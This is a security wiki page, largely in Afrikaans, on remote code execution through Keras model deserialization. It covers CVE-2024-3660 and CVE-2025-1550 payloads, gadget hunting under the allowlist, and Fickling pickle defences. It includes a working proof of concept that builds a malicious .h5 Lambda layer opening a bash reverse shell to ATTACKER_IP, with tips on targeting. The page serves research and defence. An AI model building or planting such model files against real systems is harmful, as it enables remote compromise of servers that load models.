# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy som practical exploitation techniques op teen die Keras model deserialization pipeline, verduidelik die native .keras format internals en attack surface, en voorsien 'n navorsers toolkit vir die vind van Model File Vulnerabilities (MFVs) en post-fix gadgets.

## .keras model format internals

'n .keras file is 'n ZIP-argief wat ten minste die volgende bevat:
- metadata.json – algemene inligting (bv., Keras version)
- config.json – model-argitektuur (primary attack surface)
- model.weights.h5 – gewigte in HDF5

Die config.json dryf rekursiewe deserialisering: Keras importeer modules, los classes/functions op en rekonstrueer layers/objects vanaf attacker-controlled dictionaries.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization voer uit:
- Module import en symbol resolution van module/class_name keys
- from_config(...) of constructor invocation met attacker-controlled kwargs
- Rekursie in geneste objects (activations, initializers, constraints, etc.)

In die verlede het dit drie primitives aan 'n attacker wat config.json saamstel blootgestel:
- Beheer oor watter modules geïmporteer word
- Beheer oor watter classes/functions opgelos word
- Beheer oor kwargs wat aan constructors/from_config deurgegee word

## CVE-2024-3660 – Lambda-layer bytecode RCE

Hoof oorsaak:
- Lambda.from_config() het python_utils.func_load(...) gebruik wat base64-dekodeer en marshal.loads() op attacker bytes aanroep; Python unmarshalling kan kode uitvoer.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigering:
- Keras dwing safe_mode=True af by verstek. Geserialiseerde Python-funksies in Lambda word geblokkeer tensy 'n gebruiker uitdruklik uitskakel met safe_mode=False.

Notas:
- Legacy formats (older HDF5 saves) of ouer kodebasisse mag nie moderne kontrole afdwing nie, so “downgrade” style attacks kan steeds van toepassing wees wanneer victims ouer loaders gebruik.

## CVE-2025-1550 – Willekeurige module-import in Keras ≤ 3.8

Oorsaak:
- _retrieve_class_or_fn het onbeperkte importlib.import_module() gebruik met attacker-controlled module strings uit config.json.
- Impak: Willekeurige import van enige geïnstalleerde module (of attacker-planted module op sys.path). Kode wat tydens die import uitgevoer word, waarna objekkonstruksie plaasvind met attacker kwargs.

Eksploit-idee:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sekuriteitsverbeterings (Keras ≥ 3.9):
- Module allowlist: imports beperk tot amptelike ekosisteem-modules: keras, keras_hub, keras_cv, keras_nlp
- Standaard veilige modus: safe_mode=True blokkeer unsafe Lambda serialized-function loading
- Basiese tipekontrole: deserialized objects moet ooreenstem met verwagte tipes

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Baie produksie-stakke aanvaar nog steeds verouderde TensorFlow-Keras HDF5 modellêers (.h5). As 'n aanvaller 'n model kan oplaai wat die bediener later laai of inferensie daarop uitvoer, kan 'n Lambda layer arbitrêre Python op load/build/predict uitvoer.

Minimale PoC om 'n kwaadwillige .h5 te skep wat 'n reverse shell uitvoer wanneer dit deserialized of gebruik word:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notes and reliability tips:
- Trigger-punte: kode mag meerdere kere uitgevoer word (bv. tydens layer build/first call, model.load_model, en predict/fit). Maak payloads idempotent.
- Weergawe vasmaak: pas die teiken se TF/Keras/Python aan om serialiserings-mismatches te vermy. Byvoorbeeld, bou artefakte met Python 3.8 en TensorFlow 2.13.1 as dit die weergawe is wat die teiken gebruik.
- Vinnige omgewingsreplikasie:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validasie: 'n onskadelike payload soos os.system("ping -c 1 YOUR_IP") help uitvoering bevestig (bv., observeer ICMP met tcpdump) voordat na 'n reverse shell oorgeskakel word.

## Post-fix gadget-oppervlak binne allowlist

Selfs met allowlisting en safe mode bly 'n wye oppervlak bestaan onder toegelate Keras callables. Byvoorbeeld, keras.utils.get_file kan arbitrêre URLs na deur die gebruiker kiesbare plekke aflaai.

Gadget via Lambda wat na 'n toegelate funksie verwys (nie geserialiseerde Python bytecode nie):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Belangrike beperking:
- Lambda.call() voeg die input tensor as die eerste posisionele argument voor wanneer die teiken callable aangeroep word. Gekose gadgets moet 'n ekstra posisionele arg verdra (of *args/**kwargs aanvaar). Dit beperk watter funksies bruikbaar is.

## ML pickle-importe toelaatlys vir AI/ML-modelle (Fickling)

Baie AI/ML-modelformate (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, ouer TensorFlow-artifakte, ens.) bevat Python pickle-data. Aanvallers misbruik gereeld pickle GLOBAL-imports en objekkonstruktore om RCE of modelvervanging tydens laai te bewerkstellig. Swartlys-gebaseerde skandeerders mis dikwels nuwe of nie-gelysde gevaarlike imports.

' n Praktiese fail-closed verdediging is om Python se pickle-deserializer te hook en slegs 'n hersiene stel onskadelike, ML-verwante imports tydens unpickling toe te laat. Trail of Bits se Fickling implementeer hierdie beleid en lewer 'n gekurateeerde ML-import-toelaatlys gebou uit duisende publieke Hugging Face-pickles.

Sekuriteitsmodel vir “veilige” imports (insigte gedistilleer uit navorsing en praktyk): geïmporteerde simbole wat deur 'n pickle gebruik word, moet gelyktydig:
- Nie kode uitvoer of uitvoering veroorsaak nie (geen compiled/source code objects, shelling out, hooks, ens.)
- Nie willekeurige attributte of items kry/instel nie
- Nie imports doen of verwysings na ander Python-objekte vanaf die pickle VM bekom nie
- Nie sekondêre deserializers aktiveer nie (bv. marshal, nested pickle), selfs nie indirek nie

Skakel Fickling se beskerming so vroeg moontlik in tydens proses-opstart in sodat enige pickle-laaie wat deur frameworks (torch.load, joblib.load, ens.) uitgevoer word, nagegaan word:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operasionele wenke:
- Jy kan tydelik die hooks deaktiveer/heraktiveer waar nodig:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- As 'n bekende-goeie model geblokkeer word, brei die allowlist vir jou omgewing uit nadat jy die simbole hersien:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling bied ook generiese runtime-guards aan as jy meer gedetailleerde beheer verkies:
- fickling.always_check_safety() om kontrole af te dwing vir alle pickle.load()
- with fickling.check_safety(): vir afgebakende afdwinging
- fickling.load(path) / fickling.is_likely_safe(path) vir eenmalige kontroles

- Gee voorkeur aan nie-pickle modelformate waar moontlik (bv. SafeTensors). As jy pickle moet aanvaar, laat loaders loop onder die minste regte, sonder netwerkuitset en handhaaf die allowlist.

Hierdie allowlist-eerste strategie blokkeer aantoonbaar algemene ML pickle-uitbuitingspaaie terwyl dit hoë verenigbaarheid behou. In ToB se benchmark het Fickling 100% van sintetiese kwaadwillige lêers gemerk en ongeveer ~99% van skoon lêers van top Hugging Face repos toegelaat.


## Navorsersgereedskap

1) Sistematiese gadget-ontdekking in toegelate modules

Lys kandidaat-callables in keras, keras_nlp, keras_cv, keras_hub en prioritiseer dié met file/network/process/env newe-effekte.

<details>
<summary>Lys moontlik gevaarlike callables in allowlisted Keras-modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direkte deserialisasietoetsing (geen .keras-argief nodig nie)

Voer uitgewerkte dicts direk in Keras deserializers in om die aanvaarde parameters te leer en newe-effekte waar te neem.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Kruis-weergawe ondersoek en formate

Keras bestaan in verskeie kodebasisse/era's met verskillende beskermingsmeganismes en formate:
- TensorFlow built-in Keras: tensorflow/python/keras (erfenis, beplan om verwyder te word)
- tf-keras: afsonderlik onderhou
- Multi-backend Keras 3 (amptelik): het inheemse .keras ingestel

Herhaal toetse oor kodebasisse en formate (.keras vs legacy HDF5) om regressies of ontbrekende beskerming te openbaar.

## Verwysings

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
